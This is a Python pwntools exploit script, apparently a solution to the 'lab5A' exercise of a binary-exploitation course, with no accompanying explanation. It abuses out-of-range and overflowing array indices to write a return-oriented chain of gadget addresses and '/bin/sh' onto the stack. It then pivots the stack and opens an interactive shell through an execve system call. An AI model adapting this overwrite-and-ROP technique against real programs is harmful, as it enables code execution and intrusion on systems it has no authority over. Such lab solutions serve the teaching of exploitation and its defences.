from pwn import *

INT_MAX = 2147483647

p = process('./lab5A')

p.recv(2048)
def read(index):
    p.sendline("read")
    p.sendline(str(index))
    p.recvuntil('is')
    leak = p.recvuntil('\n')
    if int(leak) != 0 :
        log.info("leak at index %d is %s"%(index,hex(int(leak))))
        if int(leak) == 0x080bfa38:
            print "======================================",index


def store(index,data):
    p.sendline("store")
    p.sendline(data)
    p.sendline(str(index))
    if index == -11 :
        p.interactive()
    else :
        print p.recvuntil('\n')

# gdb.attach(p,'''
# b *0x8049f5e
# b *0x080481c9
# ''')

#ret =-11 : pivot 134520670
#index -7 : another pivot : 134725372
#index 1 : popeax : 134989014

store(2147483657,str(0x0806fa80))   # 9 : int 0x80
store(8,"4294956392")               # 8 : stack address where /bin stored
store(7,str(0x080481c9))            # 7 : pop ebx
store(41,"1752379183")               # 41 : /sh\x00
store(40,"1852400175")               # 40 : /bin
store(2147483654,"0")               # 6 :  null
store(5,str(0x0806f3aa))            # 5 : popecx
store(4,"0")                        # 4 : null
store(2147483651,str(0x080e6255))   # 3 : popedx
store(2,"11")                       # 2 : 0xb
store(1,"134989014")                # 1 : popeax
store(-7,"134725372")               # pivot
store(-11,"134520670")              # return to pivot
